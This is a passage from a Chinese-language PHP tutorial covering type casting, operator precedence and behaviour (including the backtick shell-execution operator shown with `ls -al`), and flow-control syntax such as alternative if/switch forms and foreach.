<p>settype ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>&amp;$var</code> , string <code>$type</code> ) : bool</p>
<p>var是待转换变量。type是要转换的类型。返回值是成功与否。</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$foo = <span class="string">"5bar"</span>; <span class="comment">// string</span></span><br><span class="line">$bar = <span class="keyword">true</span>;   <span class="comment">// boolean</span></span><br><span class="line"></span><br><span class="line">settype($foo, <span class="string">"integer"</span>); <span class="comment">// $foo 现在是 5   (integer)</span></span><br><span class="line">settype($bar, <span class="string">"string"</span>);  <span class="comment">// $bar 现在是 "1" (string)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="类型强制转换"><a href="#类型强制转换" class="headerlink" title="类型强制转换"></a>类型强制转换</h4><p>在要转换的变量之前加上用括号括起来的目标类型。</p>
<p>允许的强制转换有：</p>
<ul>
<li>(int), (integer) - 转换为整形 <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a></li>
<li>(bool), (boolean) - 转换为布尔类型 <a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a></li>
<li>(float), (double), (real) - 转换为浮点型 <a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a></li>
<li>(string) - 转换为字符串 <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></li>
<li>(array) - 转换为数组 <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></li>
<li>(object) - 转换为对象 <a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a></li>
<li>(unset) - 转换为 <a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">NULL</a> (PHP 5)</li>
<li>(binary) 转换和 b 前缀转换支持为 PHP 5.2.1 新增。转换为二进制字符串。</li>
</ul>
<blockquote>
<p><strong>Note:</strong> 可以将变量放置在双引号中的方式来代替将变量转换成字符串。</p>
</blockquote>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><table>
<thead>
<tr>
<th align="left">结合方向</th>
<th align="left">运算符</th>
<th align="left">附加信息</th>
</tr>
</thead>
<tbody><tr>
<td align="left">无</td>
<td align="left">clone new</td>
<td align="left"><a href="https://www.php.net/manual/zh/language.oop5.cloning.php" target="_blank" rel="noopener">clone</a> 和 <a href="https://www.php.net/manual/zh/language.oop5.basic.php#language.oop5.basic.new" target="_blank" rel="noopener">new</a></td>
</tr>
<tr>
<td align="left">右</td>
<td align="left">****</td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.arithmetic.php" target="_blank" rel="noopener">算术运算符</a></td>
</tr>
<tr>
<td align="left">右</td>
<td align="left"><em>++</em> <em>–</em> <em>~</em> <em>(int)</em> <em>(float)</em> <em>(string)</em> <em>(array)</em> <em>(object)</em> <em>(bool)</em> <em>@</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.php" target="_blank" rel="noopener">类型</a>、<a href="https://www.php.net/manual/zh/language.operators.increment.php" target="_blank" rel="noopener">递增／递减</a>、<a href="https://www.php.net/manual/zh/language.operators.errorcontrol.php" target="_blank" rel="noopener">错误控制</a></td>
</tr>
<tr>
<td align="left">无</td>
<td align="left"><em>instanceof</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.php" target="_blank" rel="noopener">类型</a></td>
</tr>
<tr>
<td align="left">右</td>
<td align="left"><em>!</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">逻辑运算符</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">*** <em>/</em> <em>%</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.arithmetic.php" target="_blank" rel="noopener">算术运算符</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left"><em>+</em> <em>-</em> <em>.</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.arithmetic.php" target="_blank" rel="noopener">算术运算符</a> 和 <a href="https://www.php.net/manual/zh/language.operators.string.php" target="_blank" rel="noopener">字符串运算符</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left"><em>&lt;&lt;* *&gt;&gt;</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.bitwise.php" target="_blank" rel="noopener">位运算符</a></td>
</tr>
<tr>
<td align="left">无</td>
<td align="left"><em>&lt;* *&lt;=* *&gt;</em> <em>&gt;=</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">比较运算符</a></td>
</tr>
<tr>
<td align="left">无</td>
<td align="left"><em>==</em> <em>!=</em> <em>===</em> <em>!==</em> <em>&lt;&gt;</em> <em>&lt;=&gt;</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">比较运算符</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left"><em>&amp;</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.bitwise.php" target="_blank" rel="noopener">位运算符</a> 和 <a href="https://www.php.net/manual/zh/language.references.php" target="_blank" rel="noopener">引用</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left"><em>^</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.bitwise.php" target="_blank" rel="noopener">位运算符</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left"><em>|</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.bitwise.php" target="_blank" rel="noopener">位运算符</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left"><em>&amp;&amp;</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">逻辑运算符</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left"><em>||</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">逻辑运算符</a></td>
</tr>
<tr>
<td align="left">右</td>
<td align="left"><em>??</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.coalesce" target="_blank" rel="noopener">null 合并运算符</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left"><em>? :</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.ternary" target="_blank" rel="noopener">三元运算符</a></td>
</tr>
<tr>
<td align="left">右</td>
<td align="left"><em>=</em> <em>+=</em> <em>-=</em> **=* ***=* <em>/=</em> <em>.=</em> <em>%=</em> <em>&amp;=</em> <em>|=</em> <em>^=</em> <em>&lt;&lt;=* *&gt;&gt;=</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.assignment.php" target="_blank" rel="noopener">赋值运算符</a></td>
</tr>
<tr>
<td align="left">右</td>
<td align="left"><em>yield from</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.generators.syntax.php#control-structures.yield.from" target="_blank" rel="noopener">yield from</a></td>
</tr>
<tr>
<td align="left">右</td>
<td align="left"><em>yield</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.generators.syntax.php#control-structures.yield" target="_blank" rel="noopener">yield</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left"><em>and</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">逻辑运算符</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left"><em>xor</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">逻辑运算符</a></td>
</tr>
<tr>
<td align="left">左</td>
<td align="left"><em>or</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">逻辑运算符</a></td>
</tr>
</tbody></table>
<h3 id="比较运算"><a href="#比较运算" class="headerlink" title="比较运算"></a>比较运算</h3><p>注意 <code>==</code> 和 <code>===</code> 的区别。</p>
<p>特别注意的是，$a &lt;&gt; $b 与 $a != $b 表示相同的意思。$a &lt;=&gt; $b是结合比较运算符，当$a小于、等于、大于$b时分别返回一个小于、等于、大于0的<a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> 值。 PHP7开始提供。</p>
<p><strong>多类型比较（按顺序）</strong></p>
<table>
<thead>
<tr>
<th align="left">运算数 1 类型</th>
<th align="left">运算数 2 类型</th>
<th align="left">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">null</a> 或 <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td>
<td align="left">将 <strong><code>NULL</code></strong> 转换为 “”，进行数字或词汇比较</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">bool</a> 或 <a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">null</a></td>
<td align="left">任何其它类型</td>
<td align="left">转换为 <a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">bool</a>，**<code>FALSE</code>** &lt; <strong><code>TRUE</code></strong></td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a></td>
<td align="left">内置类可以定义自己的比较，不同类不能比较，相同类和数组同样方式比较属性（PHP 4 中），PHP 5 有其自己的<a href="https://www.php.net/manual/zh/language.oop5.object-comparison.php" target="_blank" rel="noopener">说明</a></td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>，<a href="https://www.php.net/manual/zh/language.types.resource.php" target="_blank" rel="noopener">resource</a> 或 <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.number" target="_blank" rel="noopener">number</a></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>，<a href="https://www.php.net/manual/zh/language.types.resource.php" target="_blank" rel="noopener">resource</a> 或 <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.number" target="_blank" rel="noopener">number</a></td>
<td align="left">将字符串和资源转换成数字，按普通数学比较</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></td>
<td align="left">具有较少成员的数组较小，如果运算数 1 中的键不存在于运算数 2 中则数组无法比较，否则挨个值比较（见下例）</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a></td>
<td align="left">任何其它类型</td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a> 总是更大</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></td>
<td align="left">任何其它类型</td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a> 总是更大</td>
</tr>
</tbody></table>
<p>注意！由于由于浮点数 <a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a> 的内部表达方式，不应比较两个浮点数<a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>是否相等。更多信息参见 <a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>。</p>
<h3 id="三目运算"><a href="#三目运算" class="headerlink" title="三目运算"></a>三目运算</h3><p>表达式 <em>(expr1) ? (expr2) : (expr3)</em> 在 expr1 求值为 <strong><code>TRUE</code></strong> 时的值为 expr2，在 expr1 求值为 <strong><code>FALSE</code></strong> 时的值为 expr3。</p>
<p>自 PHP 5.3 起，可以省略三元运算符中间那部分。表达式 <em>expr1 ?: expr3</em> 在 expr1 求值为 <strong><code>TRUE</code></strong> 时返回 expr1，否则返回 expr3。</p>
<p>注意三元运算符是个语句，因此其求值不是变量，而是语句的结果。在一个通过引用返回的函数中语句 <em>return $var == 42 ? $a : $b;</em> 将不起作用，以后的 PHP 版本会为此发出一条警告。</p>
<h3 id="NULL合并运算"><a href="#NULL合并运算" class="headerlink" title="NULL合并运算"></a>NULL合并运算</h3><p>当 expr1 为 **<code>NULL</code>**，表达式 <em>(expr1) ?? (expr2)</em> 等同于 expr2，否则为 expr1。</p>
<p>尤其要注意，当不存在左侧的值时，此运算符也和 <a href="https://www.php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">isset()</a> 一样不会产生警告。 对于 array 键尤其有用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// NULL 合并运算符的例子</span></span><br><span class="line">$action = $_POST[<span class="string">'action'</span>] ?? <span class="string">'default'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上例子等同于于以下 if/else 语句</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    $action = $_POST[<span class="string">'action'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action = <span class="string">'default'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意NULL 合并运算符是一个表达式，产生的也是表达式结果，而不是变量。在返回引用的函数里就无法使用这样的语句：*return $foo ?? $bar;*，还会提示警告。</p>
<p>NULL 合并运算符支持简单的嵌套：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$foo = <span class="keyword">null</span>;</span><br><span class="line">$bar = <span class="keyword">null</span>;</span><br><span class="line">$baz = <span class="number">1</span>;</span><br><span class="line">$qux = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $foo ?? $bar ?? $baz ?? $qux; <span class="comment">// 输出 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="算数运算"><a href="#算数运算" class="headerlink" title="算数运算"></a>算数运算</h3><p>除了加减乘除取模外还有：取反：<code>-$x</code> ，并置：<code>$a.$b</code>。</p>
<p>取反是取相反数，并置是连接两个字符串。</p>
<p>取反会先将待取反的变量转换为数值的形式。</p>
<h3 id="赋值运算"><a href="#赋值运算" class="headerlink" title="赋值运算"></a>赋值运算</h3><p>没什么好说的。注意 $a .= $b 和 $a = $a . $b 表示的意思相同。</p>
<h3 id="递增递减"><a href="#递增递减" class="headerlink" title="递增递减"></a>递增递减</h3><p>x++, ++x, x–, –x。</p>
<h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><p>and与 / or或  /xor异或 / &amp;&amp;与 / ||或 / !非。</p>
<h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><table>
<thead>
<tr>
<th align="left">例子</th>
<th align="left">名称</th>
<th align="left">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong><code>$a &amp; $b</code></strong></td>
<td align="left">And（按位与）</td>
<td align="left">将把 $a 和 $b 中都为 1 的位设为 1。</td>
</tr>
<tr>
<td align="left">**`$a</td>
<td align="left">$b`**</td>
<td align="left">Or（按位或）</td>
</tr>
<tr>
<td align="left"><strong><code>$a ^ $b</code></strong></td>
<td align="left">Xor（按位异或）</td>
<td align="left">将把 $a 和 $b 中一个为 1 另一个为 0 的位设为 1。</td>
</tr>
<tr>
<td align="left"><strong><code>~ $a</code></strong></td>
<td align="left">Not（按位取反）</td>
<td align="left">将 $a 中为 0 的位设为 1，反之亦然。</td>
</tr>
<tr>
<td align="left"><strong><code>$a &lt;&lt; $b</code></strong></td>
<td align="left">Shift left（左移）</td>
<td align="left">将 $a 中的位向左移动 $b 次（每一次移动都表示“乘以 2”）。</td>
</tr>
<tr>
<td align="left"><strong><code>$a &gt;&gt; $b</code></strong></td>
<td align="left">Shift right（右移）</td>
<td align="left">将 $a 中的位向右移动 $b 次（每一次移动都表示“除以 2”）。</td>
</tr>
</tbody></table>
<p>位移在 PHP 中是数学运算。向任何方向（左右）移出去的位都被丢弃。左移时右侧以零填充，<strong>符号位被移走意味着正负号不被保留。</strong>右移时左侧以符号位填充，意味着正负号被保留。</p>
<p>若&amp;，/，^左右是字符串，则对ASCII做运算以后得到字符串结果，对于其它类型全部转成Integer，得到Integer结果。~操作同理。&lt;&lt;和&gt;&gt;左右两边都被当作 Integer 处理，String也不会转成ASCII。</p>
<p>PHP 的 ini 设定 error_reporting 使用了按位的值，提供了关闭某个位的实例。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">E_ALL ^ E_NOTICE</span><br><span class="line">具体运作方式是先取得 E_ALL 的值：</span><br><span class="line"><span class="number">00000000000000000111011111111111</span></span><br><span class="line">再取得 E_NOTICE 的值：</span><br><span class="line"><span class="number">00000000000000000000000000001000</span></span><br><span class="line">最后再用^得到两个值中都设定了（为 <span class="number">1</span>）的位：</span><br><span class="line"><span class="number">00000000000000000111011111110111</span></span><br></pre></td></tr></table></figure>

<h3 id="错误控制运算"><a href="#错误控制运算" class="headerlink" title="错误控制运算"></a>错误控制运算</h3><p>@符号。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</p>
<p>如果用 <a href="https://www.php.net/manual/zh/function.set-error-handler.php" target="_blank" rel="noopener">set_error_handler()</a> 设定了自定义的错误处理函数，仍然会被调用，但是此错误处理函数可以（并且也应该）调用 <a href="https://www.php.net/manual/zh/function.error-reporting.php" target="_blank" rel="noopener">error_reporting()</a>，而该函数在出错语句前有 @ 时将返回 0。</p>
<p>如果激活了 <a href="https://www.php.net/manual/zh/errorfunc.configuration.php#ini.track-errors" target="_blank" rel="noopener"><strong>track_errors</strong></a> 特性，表达式所产生的任何错误信息都被存放在变量 <a href="https://www.php.net/manual/zh/reserved.variables.phperrormsg.php" target="_blank" rel="noopener"><strong>$php_errormsg</strong></a> 中。此变量在每次出错时都会被覆盖，所以如果想用它的话就要尽早检查。</p>
<h3 id="执行运算"><a href="#执行运算" class="headerlink" title="执行运算"></a>执行运算</h3><p>反引号（``）。PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符的效果与函数 <a href="https://www.php.net/manual/zh/function.shell-exec.php" target="_blank" rel="noopener">shell_exec()</a> 相同。</p>
<p>注：exec命令，如果指定了command，它就会取代当前的shell而不是创建新的进程。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$output = `ls -al`;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$output&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>反引号运算符在激活了<a href="https://www.php.net/manual/zh/ini.sect.safe-mode.php#ini.safe-mode" target="_blank" rel="noopener">安全模式</a>或者关闭了 <a href="https://www.php.net/manual/zh/function.shell-exec.php" target="_blank" rel="noopener">shell_exec()</a> 时是无效的。</p>
<p>与其它某些语言不同，反引号不能在双引号字符串中使用。但是，由变量搭载则可以使用，如上例。</p>
<h3 id="数组运算"><a href="#数组运算" class="headerlink" title="数组运算"></a>数组运算</h3><table>
<thead>
<tr>
<th align="left">例子</th>
<th align="left">名称</th>
<th align="left">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$a + $b</td>
<td align="left">联合</td>
<td align="left">$a 和 $b 的联合。</td>
</tr>
<tr>
<td align="left">$a == $b</td>
<td align="left">相等</td>
<td align="left">如果 $a 和 $b 具有相同的键／值对则为 **<code>TRUE</code>**。</td>
</tr>
<tr>
<td align="left">$a === $b</td>
<td align="left">全等</td>
<td align="left">如果 $a 和 $b 具有相同的键／值对并且顺序和类型都相同则为 **<code>TRUE</code>**。</td>
</tr>
<tr>
<td align="left">$a != $b</td>
<td align="left">不等</td>
<td align="left">如果 $a 不等于 $b 则为 **<code>TRUE</code>**。</td>
</tr>
<tr>
<td align="left">$a &lt;&gt; $b</td>
<td align="left">不等</td>
<td align="left">如果 $a 不等于 $b 则为 **<code>TRUE</code>**。</td>
</tr>
<tr>
<td align="left">$a !== $b</td>
<td align="left">不全等</td>
<td align="left">如果 $a 不全等于 $b 则为 **<code>TRUE</code>**。</td>
</tr>
</tbody></table>
<p><em>+</em> 运算符把右边的数组元素附加到左边的数组后面，两个数组中都有的键名，则只用左边数组中的，右边的被忽略。</p>
<h3 id="类型运算"><a href="#类型运算" class="headerlink" title="类型运算"></a>类型运算</h3><p><em>instanceof</em> 用于确定一个 PHP 变量是否属于某一类的实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotMyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> MyClass;</span><br><span class="line"></span><br><span class="line">var_dump($a <span class="keyword">instanceof</span> MyClass);   <span class="comment">//bool(true)</span></span><br><span class="line">var_dump($a <span class="keyword">instanceof</span> NotMyClass);   <span class="comment">//bool(false)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>也可以用来确定一个变量是不是继承自某一父类的子类的实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParentClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> <span class="keyword">extends</span> <span class="title">ParentClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> MyClass;</span><br><span class="line"></span><br><span class="line">var_dump($a <span class="keyword">instanceof</span> MyClass);</span><br><span class="line">var_dump($a <span class="keyword">instanceof</span> ParentClass);   <span class="comment">//bool(true)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以用 <code>!</code> 检查对象不是某个类的实例。</p>
<p>也可用于确定一个变量是不是实现了某个<a href="https://www.php.net/manual/zh/language.oop5.interfaces.php" target="_blank" rel="noopener">接口</a>的对象的实例。</p>
<p>虽然 <em>instanceof</em> 通常直接与类名一起使用，但也可以使用对象或字符串变量。</p>
<p>instanceof 的使用还有一些陷阱必须了解。在 PHP 5.1.0 之前，如果要检查的类名称不存在，<em>instanceof</em> 会调用 <a href="https://www.php.net/manual/zh/function.autoload.php" target="_blank" rel="noopener">__autoload()</a>。另外，如果该类没有被装载则会产生一个致命错误。可以通过使用动态类引用或用一个包含类名的字符串变量来避开这种问题。</p>
<p><em>instanceof</em> 运算符是 PHP 5 引进的。在此之前用 <a href="https://www.php.net/manual/zh/function.is-a.php" target="_blank" rel="noopener">is_a()</a>，但是后来 <a href="https://www.php.net/manual/zh/function.is-a.php" target="_blank" rel="noopener">is_a()</a> 被废弃而用 <em>instanceof</em> 替代了。注意自 PHP 5.3.0 起，又恢复使用 <a href="https://www.php.net/manual/zh/function.is-a.php" target="_blank" rel="noopener">is_a()</a> 了。参见 <a href="https://www.php.net/manual/zh/function.get-class.php" target="_blank" rel="noopener">get_class()</a> 和 <a href="https://www.php.net/manual/zh/function.is-a.php" target="_blank" rel="noopener">is_a()</a>。</p>
<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="不必多说的"><a href="#不必多说的" class="headerlink" title="不必多说的"></a>不必多说的</h3><p>if，else，while, do while, for</p>
<h3 id="elseif-else-if"><a href="#elseif-else-if" class="headerlink" title="elseif/else if"></a>elseif/else if</h3><p>必须要注意的是 <em>elseif</em> 与 <em>else if</em> 只有在使用花括号的情况下才认为是完全相同。如果用冒号来定义 <em>if</em>/<em>elseif</em> 条件，那就不能用两个单词的 <em>else if</em>，否则 PHP 会产生解析错误。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 不正确的使用方法： */</span></span><br><span class="line"><span class="keyword">if</span> ($a &gt; $b):</span><br><span class="line">    <span class="keyword">echo</span> $a.<span class="string">" is greater than "</span>.$b;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($a == $b): <span class="comment">// 将无法编译</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"The above line causes a parse error."</span>;</span><br><span class="line"><span class="keyword">endif</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 正确的使用方法： */</span></span><br><span class="line"><span class="keyword">if</span> ($a &gt; $b):</span><br><span class="line">    <span class="keyword">echo</span> $a.<span class="string">" is greater than "</span>.$b;</span><br><span class="line"><span class="keyword">elseif</span> ($a == $b): <span class="comment">// 注意使用了一个单词的 elseif</span></span><br><span class="line">    <span class="keyword">echo</span> $a.<span class="string">" equals "</span>.$b;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">echo</span> $a.<span class="string">" is neither greater than or equal to "</span>.$b;</span><br><span class="line"><span class="keyword">endif</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="流程控制的替代语法"><a href="#流程控制的替代语法" class="headerlink" title="流程控制的替代语法"></a>流程控制的替代语法</h3><p>PHP 提供了一些流程控制的替代语法，包括 <em>if</em>，<em>while</em>，<em>for</em>，<em>foreach</em> 和 <em>switch</em>。替代语法的基本形式是把左花括号（{）换成冒号（:），把右花括号（}）分别换成 <code>endif;</code>，<code>endwhile;</code>，<code>endfor;</code>，<code>endforeach;</code> 以及 <code>endswitch;</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($a == <span class="number">5</span>): <span class="meta">?&gt;</span></span><br><span class="line">A is equal to <span class="number">5</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在上面的例子中，HTML 内容“A is equal to 5”用替代语法嵌套在 <em>if</em> 语句中。该 HTML 的内容仅在 $a 等于 5 时显示。</p>
<p>不支持在同一个控制块内混合使用两种语法。</p>
<p><em>switch</em> 和第一个 <em>case</em> 之间的任何输出（含空格）将导致语法错误。例如，这样是无效的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">switch</span> ($foo): <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">case</span> <span class="number">1</span>: <span class="meta">?&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endswitch</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>而这样是有效的，因为 <em>switch</em> 之后的换行符被认为是结束标记 <em>?&gt;</em> 的一部分，所以在 <em>switch</em> 和 <em>case</em> 之间不能有任何输出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">switch</span> ($foo): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">case</span> <span class="number">1</span>: <span class="meta">?&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endswitch</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><p><em>foreach</em> 语法结构提供了遍历数组的简单方式。<em>foreach</em> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $value)</span><br><span class="line">    statement</span><br><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure>

<p>第一种格式遍历给定的 <em>array_expression</em> 数组。每次循环中，当前单元的值被赋给 <em>$value</em> 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p>
<p>第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 <em>$key</em>。</p>
<p>当 <em>foreach</em> 开始执行时，数组内部的指针会自动指向第一个单元。这意味着不需要在 <em>foreach</em> 循环之前调用 <a href="https://www.php.net/manual/zh/function.reset.php" target="_blank" rel="noopener">reset()</a>。</p>
